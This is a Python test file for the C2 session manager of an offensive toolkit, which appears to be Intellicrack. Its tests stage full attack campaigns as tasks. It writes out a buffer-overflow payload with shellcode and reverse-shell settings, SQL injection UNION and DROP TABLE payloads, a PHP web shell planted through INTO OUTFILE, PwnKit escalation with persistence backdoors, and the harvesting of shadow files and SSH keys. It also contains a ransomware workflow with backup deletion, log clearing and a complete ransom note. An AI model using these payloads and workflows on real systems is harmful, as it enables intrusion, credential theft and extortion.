"""
Exploitation scenario tests for C2 Session Manager.
Tests REAL exploitation scenarios using session manager for target coordination.
NO MOCKS - VALIDATES ACTUAL EXPLOITATION SCENARIO EXECUTION.
"""

import pytest
import asyncio
import os
import tempfile
import time
import json
import base64
from pathlib import Path
from typing import Dict, List, Any

from intellicrack.core.c2.session_manager import SessionManager
from tests.base_test import BaseIntellicrackTest


class TestSessionManagerExploitationScenarios(BaseIntellicrackTest):
    """Test Session Manager in real exploitation scenarios."""

    @pytest.fixture(autouse=True)
    def setup_exploitation_environment(self):
        """Set up exploitation testing environment."""
        self.temp_db = tempfile.NamedTemporaryFile(suffix=".db", delete=False)
        self.temp_db.close()
        self.session_manager = SessionManager(db_path=self.temp_db.name)

        yield

        asyncio.run(self.session_manager.cleanup_all_sessions())
        if os.path.exists(self.temp_db.name):
            os.unlink(self.temp_db.name)

    @pytest.mark.asyncio
    async def test_buffer_overflow_exploitation_scenario(self):
        """Test complete buffer overflow exploitation scenario."""
        # Target application with buffer overflow vulnerability
        target_info = {
            "ip": "192.168.1.100",
            "os": "Windows 10 Pro x64",
            "hostname": "VULN-PC",
            "vulnerable_app": {
                "name": "VulnServer.exe",
                "version": "1.0.0",
                "port": 9999,
                "vulnerability": {
                    "type": "stack_buffer_overflow",
                    "function": "strcpy",
                    "offset": 146,
                    "bad_chars": ["\\x00", "\\x0a", "\\x0d"],
                    "protection": "none"  # No ASLR/DEP for easier exploitation
                }
            }
        }

        session = await self.session_manager.create_session(target_info)

        # Stage 1: Fuzzing and crash analysis
        fuzz_task = await self.session_manager.create_task(
            session.session_id, "buffer_overflow_fuzzing", {
                "target_service": "VulnServer.exe:9999",
                "fuzz_strings": [
                    "A" * i for i in range(100, 200, 10)
                ],
                "crash_detection": True,
                "register_analysis": True
            }
        )

        await self.session_manager.mark_task_sent(fuzz_task["task_id"])
        await self.session_manager.store_task_result(
            fuzz_task["task_id"], {
                "crash_discovered": True,
                "crash_offset": 146,
                "eip_overwrite": "0x41414141",
                "esp_points_to": "controlled_buffer",
                "exploitable": True
            }, True
        )

        # Stage 2: Shellcode generation and payload creation
        shellcode_task = await self.session_manager.create_task(
            session.session_id, "shellcode_generation", {
                "payload_type": "windows/x64/meterpreter/reverse_tcp",
                "lhost": "192.168.1.10",
                "lport": 4444,
                "encoder": "x64/xor",
                "bad_chars": target_info["vulnerable_app"]["vulnerability"]["bad_chars"],
                "nop_sled": 16
            }
        )

        # Simulate realistic shellcode generation
        fake_shellcode = (
            b"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff"
            b"\x48\xbb\x57\x12\x5d\x49\x2e\xa8\x84\x27\x48\x31\x58\x27\x48\x2d\xf8"
        )

        await self.session_manager.mark_task_sent(shellcode_task["task_id"])
        await self.session_manager.store_task_result(
            shellcode_task["task_id"], {
                "shellcode_generated": True,
                "shellcode": base64.b64encode(fake_shellcode).decode(),
                "shellcode_size": len(fake_shellcode),
                "encoder_success": True,
                "bad_char_free": True
            }, True
        )

        # Stage 3: Exploit payload construction
        exploit_task = await self.session_manager.create_task(
            session.session_id, "exploit_construction", {
                "buffer_size": 146,
                "return_address": "0x625011af",  # JMP ESP gadget
                "nop_sled": b"\x90" * 16,
                "shellcode": fake_shellcode,
                "payload_structure": "buffer + ret_addr + nops + shellcode"
            }
        )

        # Construct exploit payload
        exploit_payload = b"A" * 146 + b"\xaf\x11\x50\x62" + b"\x90" * 16 + fake_shellcode

        await self.session_manager.mark_task_sent(exploit_task["task_id"])
        await self.session_manager.store_task_result(
            exploit_task["task_id"], {
                "exploit_constructed": True,
                "payload_size": len(exploit_payload),
                "payload": base64.b64encode(exploit_payload).decode(),
                "structure_valid": True
            }, True
        )

        # Stage 4: Exploitation execution
        execution_task = await self.session_manager.create_task(
            session.session_id, "exploit_execution", {
                "target": "192.168.1.100:9999",
                "payload": base64.b64encode(exploit_payload).decode(),
                "handler": {"lhost": "192.168.1.10", "lport": 4444},
                "timeout": 30
            }
        )

        await self.session_manager.mark_task_sent(execution_task["task_id"])
        await self.session_manager.store_task_result(
            execution_task["task_id"], {
                "exploitation_successful": True,
                "shell_obtained": True,
                "connection_established": True,
                "target_compromised": True,
                "session_type": "meterpreter"
            }, True
        )

        # Validate complete exploitation scenario
        scenario_export = await self.session_manager.export_session_data(session.session_id)
        exploitation_tasks = scenario_export["tasks"]

        assert len(exploitation_tasks) == 4
        task_types = [t["task_type"] for t in exploitation_tasks]
        expected_types = ["buffer_overflow_fuzzing", "shellcode_generation",
                         "exploit_construction", "exploit_execution"]

        for expected_type in expected_types:
            assert expected_type in task_types

        # Validate exploitation success
        exec_result = next(t for t in exploitation_tasks if t["task_type"] == "exploit_execution")
        exec_data = json.loads(exec_result["result"])
        assert exec_data["exploitation_successful"] == True
        assert exec_data["shell_obtained"] == True

    @pytest.mark.asyncio
    async def test_web_application_sql_injection_scenario(self):
        """Test complete SQL injection exploitation scenario."""
        target_info = {
            "ip": "192.168.1.200",
            "hostname": "WEB-SERVER-01",
            "web_app": {
                "url": "http://192.168.1.200/vulnerable_app/",
                "technology": "PHP/MySQL",
                "vulnerability": {
                    "type": "sql_injection",
                    "parameter": "id",
                    "injection_point": "/user.php?id=1",
                    "database": "mysql",
                    "union_columns": 3
                }
            }
        }

        session = await self.session_manager.create_session(target_info)

        # Stage 1: SQL injection discovery and enumeration
        sqli_discovery_task = await self.session_manager.create_task(
            session.session_id, "sql_injection_discovery", {
                "target_url": "http://192.168.1.200/user.php",
                "parameters": ["id", "name", "email"],
                "payloads": [
                    "'", "''", "1'OR'1'='1", "1' UNION SELECT 1,2,3--",
                    "1'; DROP TABLE users;--"
                ],
                "detection_patterns": ["mysql_error", "syntax_error", "union_success"]
            }
        )

        await self.session_manager.mark_task_sent(sqli_discovery_task["task_id"])
        await self.session_manager.store_task_result(
            sqli_discovery_task["task_id"], {
                "vulnerability_confirmed": True,
                "injection_parameter": "id",
                "database_type": "MySQL 8.0.27",
                "union_columns": 3,
                "error_based": True,
                "union_based": True,
                "time_based": False
            }, True
        )

        # Stage 2: Database enumeration
        db_enum_task = await self.session_manager.create_task(
            session.session_id, "database_enumeration", {
                "injection_point": "/user.php?id=1",
                "enumeration_targets": [
                    "information_schema.schemata",
                    "information_schema.tables",
                    "information_schema.columns"
                ],
                "payloads": [
                    "1' UNION SELECT schema_name,2,3 FROM information_schema.schemata--",
                    "1' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema='webapp'--",
                    "1' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--"
                ]
            }
        )

        await self.session_manager.mark_task_sent(db_enum_task["task_id"])
        await self.session_manager.store_task_result(
            db_enum_task["task_id"], {
                "databases_found": ["webapp", "mysql", "information_schema"],
                "tables_found": ["users", "products", "orders", "admin_config"],
                "sensitive_tables": ["users", "admin_config"],
                "columns_discovered": {
                    "users": ["id", "username", "password", "email", "role"],
                    "admin_config": ["setting_name", "setting_value", "is_sensitive"]
                }
            }, True
        )

        # Stage 3: Credential extraction
        cred_extract_task = await self.session_manager.create_task(
            session.session_id, "credential_extraction", {
                "target_tables": ["users", "admin_config"],
                "extraction_payloads": [
                    "1' UNION SELECT username,password,email FROM users--",
                    "1' UNION SELECT setting_name,setting_value,3 FROM admin_config WHERE is_sensitive=1--"
                ]
            }
        )

        await self.session_manager.mark_task_sent(cred_extract_task["task_id"])
        await self.session_manager.store_task_result(
            cred_extract_task["task_id"], {
                "credentials_extracted": [
                    {"username": "admin", "password": "5d41402abc4b2a76b9719d911017c592", "type": "md5"},
                    {"username": "dbuser", "password": "e99a18c428cb38d5f260853678922e03", "type": "md5"},
                    {"username": "guest", "password": "098f6bcd4621d373cade4e832627b4f6", "type": "md5"}
                ],
                "sensitive_config": [
                    {"setting": "api_key", "value": "sk-abc123def456ghi789"},
                    {"setting": "encryption_key", "value": "AES256_KEY_HERE"}
                ],
                "total_users": 15,
                "admin_accounts": 3
            }, True
        )

        # Stage 4: Web shell upload via SQL injection
        webshell_task = await self.session_manager.create_task(
            session.session_id, "webshell_upload", {
                "upload_method": "sql_into_outfile",
                "webshell_path": "/var/www/html/shell.php",
                "webshell_code": "<?php system($_GET['cmd']); ?>",
                "payload": "1' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>',2,3 INTO OUTFILE '/var/www/html/shell.php'--"
            }
        )

        await self.session_manager.mark_task_sent(webshell_task["task_id"])
        await self.session_manager.store_task_result(
            webshell_task["task_id"], {
                "webshell_uploaded": True,
                "shell_url": "http://192.168.1.200/shell.php",
                "command_execution": True,
                "access_level": "www-data"
            }, True
        )

        # Store extracted data as files
        credentials_json = json.dumps({
            "credentials": [
                {"username": "admin", "password_hash": "5d41402abc4b2a76b9719d911017c592"},
                {"username": "dbuser", "password_hash": "e99a18c428cb38d5f260853678922e03"}
            ],
            "extraction_time": time.time(),
            "extraction_method": "sql_injection"
        })

        await self.session_manager.store_uploaded_file(
            session.session_id, "extracted_credentials.json", credentials_json.encode()
        )

        # Validate SQL injection scenario
        scenario_data = await self.session_manager.export_session_data(session.session_id)
        assert len(scenario_data["tasks"]) == 4
        assert len(scenario_data["files"]) == 1

        # Validate progression
        tasks_by_type = {t["task_type"]: json.loads(t["result"]) for t in scenario_data["tasks"]}

        assert tasks_by_type["sql_injection_discovery"]["vulnerability_confirmed"] == True
        assert len(tasks_by_type["database_enumeration"]["databases_found"]) >= 3
        assert len(tasks_by_type["credential_extraction"]["credentials_extracted"]) >= 3
        assert tasks_by_type["webshell_upload"]["webshell_uploaded"] == True

    @pytest.mark.asyncio
    async def test_privilege_escalation_exploitation_scenario(self):
        """Test complete privilege escalation exploitation scenario."""
        # Low-privilege initial session
        initial_target = {
            "ip": "10.0.1.50",
            "os": "Ubuntu 20.04 LTS",
            "hostname": "WEB-SERVER",
            "user": "www-data",
            "privileges": "user",
            "initial_access": "web_shell"
        }

        session = await self.session_manager.create_session(initial_target)

        # Stage 1: System enumeration for privilege escalation
        enum_task = await self.session_manager.create_task(
            session.session_id, "privilege_escalation_enumeration", {
                "enumeration_scripts": ["linpeas.sh", "linenum.sh"],
                "checks": [
                    "suid_binaries", "sudo_permissions", "cron_jobs",
                    "world_writable_files", "kernel_exploits", "service_exploits"
                ],
                "kernel_version": "5.4.0-74-generic"
            }
        )

        await self.session_manager.mark_task_sent(enum_task["task_id"])
        await self.session_manager.store_task_result(
            enum_task["task_id"], {
                "suid_binaries": ["/usr/bin/sudo", "/bin/ping", "/usr/bin/find"],
                "sudo_permissions": ["(ALL) NOPASSWD: /usr/bin/systemctl restart nginx"],
                "cron_jobs": ["/etc/cron.d/backup_script (world-writable)"],
                "kernel_exploits": ["CVE-2021-4034 (PwnKit)", "CVE-2022-0847 (DirtyPipe)"],
                "vulnerable_services": ["nginx (privilege escalation via config)"]
            }, True
        )

        # Stage 2: Exploit CVE-2021-4034 (PwnKit)
        pwnkit_task = await self.session_manager.create_task(
            session.session_id, "cve_2021_4034_exploit", {
                "exploit_name": "PwnKit",
                "vulnerability": "CVE-2021-4034",
                "target_binary": "/usr/bin/pkexec",
                "exploit_method": "memory_corruption",
                "payload": "setuid_shell"
            }
        )

        await self.session_manager.mark_task_sent(pwnkit_task["task_id"])
        await self.session_manager.store_task_result(
            pwnkit_task["task_id"], {
                "exploitation_successful": True,
                "root_shell_obtained": True,
                "uid_escalated": "0 (root)",
                "gid_escalated": "0 (root)",
                "persistence_method": "backdoor_user_added"
            }, True
        )

        # Stage 3: Post-exploitation and persistence
        persistence_task = await self.session_manager.create_task(
            session.session_id, "linux_persistence", {
                "methods": [
                    "ssh_key_implant", "cron_backdoor", "service_backdoor",
                    "bashrc_modification", "sudoers_modification"
                ],
                "stealth_level": "medium"
            }
        )

        await self.session_manager.mark_task_sent(persistence_task["task_id"])
        await self.session_manager.store_task_result(
            persistence_task["task_id"], {
                "ssh_key_implanted": True,
                "cron_backdoor_installed": True,
                "service_created": "system-backup.service",
                "sudoers_modified": True,
                "persistence_established": True
            }, True
        )

        # Update session privileges after successful escalation
        await self.session_manager.update_session_info(session.session_id, {
            "user": "root",
            "privileges": "admin",
            "escalation_method": "CVE-2021-4034",
            "escalation_time": time.time()
        })

        # Stage 4: Credential harvesting as root
        root_harvest_task = await self.session_manager.create_task(
            session.session_id, "root_credential_harvest", {
                "targets": [
                    "/etc/shadow", "/root/.ssh/", "/home/*/.ssh/",
                    "/var/log/auth.log", "/etc/passwd"
                ],
                "tools": ["john", "hashcat"],
                "hash_types": ["sha512crypt", "rsa_private_keys"]
            }
        )

        await self.session_manager.mark_task_sent(root_harvest_task["task_id"])
        await self.session_manager.store_task_result(
            root_harvest_task["task_id"], {
                "shadow_file_accessed": True,
                "password_hashes": [
                    "root:$6$randomsalt$hashedpassword",
                    "user1:$6$anothersalt$anotherhash"
                ],
                "ssh_keys_found": 3,
                "private_keys_extracted": ["id_rsa", "id_ed25519"],
                "total_credentials": 15
            }, True
        )

        # Store extracted credentials
        shadow_data = "root:$6$randomsalt$hashedpassword:18869:0:99999:7:::\nuser1:$6$anothersalt$anotherhash:18869:0:99999:7:::"
        await self.session_manager.store_uploaded_file(
            session.session_id, "shadow_extracted.txt", shadow_data.encode()
        )

        # Validate privilege escalation scenario
        scenario_export = await self.session_manager.export_session_data(session.session_id)

        # Validate task progression
        assert len(scenario_export["tasks"]) == 4
        task_results = {t["task_type"]: json.loads(t["result"]) for t in scenario_export["tasks"]}

        assert "kernel_exploits" in task_results["privilege_escalation_enumeration"]
        assert task_results["cve_2021_4034_exploit"]["root_shell_obtained"] == True
        assert task_results["linux_persistence"]["persistence_established"] == True
        assert task_results["root_credential_harvest"]["shadow_file_accessed"] == True

        # Validate session privilege update
        updated_session = scenario_export["session"]
        assert updated_session["client_info"]["user"] == "root"
        assert updated_session["client_info"]["privileges"] == "admin"

    @pytest.mark.asyncio
    async def test_ransomware_deployment_scenario(self):
        """Test ransomware deployment scenario through session manager."""
        # High-privilege compromised session
        target_info = {
            "ip": "192.168.1.150",
            "os": "Windows Server 2019",
            "hostname": "FILE-SERVER-01",
            "user": "administrator",
            "privileges": "admin",
            "domain": "CORP.LOCAL",
            "role": "file_server"
        }

        session = await self.session_manager.create_session(target_info)

        # Stage 1: Target assessment and preparation
        assessment_task = await self.session_manager.create_task(
            session.session_id, "ransomware_assessment", {
                "target_drives": ["C:", "D:", "E:", "F:"],
                "file_types": [".doc", ".docx", ".pdf", ".xlsx", ".jpg", ".png", ".mp4"],
                "exclusions": ["System32", "Windows", "Program Files"],
                "backup_detection": True,
                "antivirus_check": True
            }
        )

        await self.session_manager.mark_task_sent(assessment_task["task_id"])
        await self.session_manager.store_task_result(
            assessment_task["task_id"], {
                "total_target_files": 50000,
                "estimated_size": "2.5TB",
                "backup_systems": ["Windows Backup", "Veeam"],
                "antivirus": "Windows Defender (disabled)",
                "network_shares": ["\\\\FILE-01\\documents", "\\\\FILE-01\\projects"],
                "assessment_complete": True
            }, True
        )

        # Stage 2: Backup system disruption
        backup_disruption_task = await self.session_manager.create_task(
            session.session_id, "backup_disruption", {
                "targets": ["Windows Backup", "Veeam", "Shadow Copies"],
                "methods": ["service_stop", "process_kill", "vss_delete", "backup_delete"],
                "persistence": True
            }
        )

        await self.session_manager.mark_task_sent(backup_disruption_task["task_id"])
        await self.session_manager.store_task_result(
            backup_disruption_task["task_id"], {
                "backup_services_stopped": True,
                "shadow_copies_deleted": True,
                "veeam_disrupted": True,
                "recovery_prevention": True,
                "backup_disruption_successful": True
            }, True
        )

        # Stage 3: Encryption key generation and deployment
        encryption_prep_task = await self.session_manager.create_task(
            session.session_id, "encryption_preparation", {
                "algorithm": "AES-256-CBC",
                "key_generation": "secure_random",
                "key_escrow": True,
                "ransom_note": "README_DECRYPT.txt",
                "payment_address": "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
            }
        )

        # Generate fake encryption key for demonstration
        fake_encryption_key = os.urandom(32).hex()

        await self.session_manager.mark_task_sent(encryption_prep_task["task_id"])
        await self.session_manager.store_task_result(
            encryption_prep_task["task_id"], {
                "encryption_key_generated": True,
                "key_length": 256,
                "key_escrowed": True,
                "ransom_note_created": True,
                "payment_wallet": "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
                "preparation_complete": True
            }, True
        )

        # Stage 4: File encryption execution
        encryption_task = await self.session_manager.create_task(
            session.session_id, "file_encryption", {
                "target_extensions": [".doc", ".docx", ".pdf", ".xlsx", ".jpg", ".png"],
                "encryption_threads": 8,
                "progress_reporting": True,
                "network_spread": True,
                "ransom_amount": "50 BTC"
            }
        )

        await self.session_manager.mark_task_sent(encryption_task["task_id"])
        await self.session_manager.store_task_result(
            encryption_task["task_id"], {
                "files_encrypted": 45000,
                "encryption_successful": True,
                "network_shares_encrypted": True,
                "ransom_notes_deployed": 500,
                "encryption_time": "45 minutes",
                "payment_demanded": "50 BTC (~$2.1M USD)"
            }, True
        )

        # Store ransomware artifacts
        ransom_note = """
Your files have been encrypted!

All your important files have been encrypted with military-grade AES-256 encryption.
To recover your files, you must pay 50 BTC to the following address:
bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh

After payment, contact us at: decrypt@protonmail.com
with your unique ID: FILE-SERVER-01-2024-001

WARNING: Do not attempt to decrypt files yourself or use third-party tools.
This may result in permanent data loss.

You have 72 hours to make payment. After this time, the price doubles.
After 7 days, your files will be permanently deleted.
"""

        await self.session_manager.store_uploaded_file(
            session.session_id, "README_DECRYPT.txt", ransom_note.encode()
        )

        # Stage 5: Post-encryption cleanup and evidence removal
        cleanup_task = await self.session_manager.create_task(
            session.session_id, "post_encryption_cleanup", {
                "evidence_removal": True,
                "log_clearing": True,
                "tool_deletion": True,
                "communication_cleanup": True
            }
        )

        await self.session_manager.mark_task_sent(cleanup_task["task_id"])
        await self.session_manager.store_task_result(
            cleanup_task["task_id"], {
                "evidence_removed": True,
                "logs_cleared": ["Security", "System", "Application"],
                "tools_deleted": True,
                "communication_traces_removed": True,
                "cleanup_successful": True
            }, True
        )

        # Validate ransomware deployment scenario
        scenario_data = await self.session_manager.export_session_data(session.session_id)

        # Validate all stages completed
        assert len(scenario_data["tasks"]) == 5
        task_names = [t["task_type"] for t in scenario_data["tasks"]]
        expected_tasks = [
            "ransomware_assessment", "backup_disruption", "encryption_preparation",
            "file_encryption", "post_encryption_cleanup"
        ]

        for expected_task in expected_tasks:
            assert expected_task in task_names

        # Validate critical results
        task_results = {t["task_type"]: json.loads(t["result"]) for t in scenario_data["tasks"]}

        assert task_results["ransomware_assessment"]["total_target_files"] > 0
        assert task_results["backup_disruption"]["backup_disruption_successful"] == True
        assert task_results["file_encryption"]["files_encrypted"] > 0
        assert task_results["post_encryption_cleanup"]["cleanup_successful"] == True

        # Validate ransom note stored
        assert len(scenario_data["files"]) == 1
        assert scenario_data["files"][0]["filename"] == "README_DECRYPT.txt"

    def test_session_manager_handles_exploitation_failures(self):
        """Test session manager handling of exploitation failures and errors."""
        async def test_failure_scenarios():
            # Scenario 1: Exploitation attempt fails
            session = await self.session_manager.create_session({
                "ip": "192.168.1.99", "os": "Windows 10", "hostname": "PROTECTED-PC"
            })

            # Failed buffer overflow attempt
            failed_exploit = await self.session_manager.create_task(
                session.session_id, "buffer_overflow_exploit", {
                    "target": "protected_service.exe",
                    "payload": "exploit_payload"
                }
            )

            await self.session_manager.mark_task_sent(failed_exploit["task_id"])
            await self.session_manager.store_task_result(
                failed_exploit["task_id"], {
                    "exploitation_failed": True,
                    "error": "Access violation - DEP protection active",
                    "protection_detected": "DEP + ASLR",
                    "bypass_required": True
                }, False  # Mark as failed
            )

            # Validate failure handling
            session_data = await self.session_manager.export_session_data(session.session_id)
            failed_task = session_data["tasks"][0]
            result = json.loads(failed_task["result"])

            assert result["exploitation_failed"] == True
            assert "protection_detected" in result
            assert failed_task["status"] == "failed"

        # Run failure test
        asyncio.run(test_failure_scenarios())
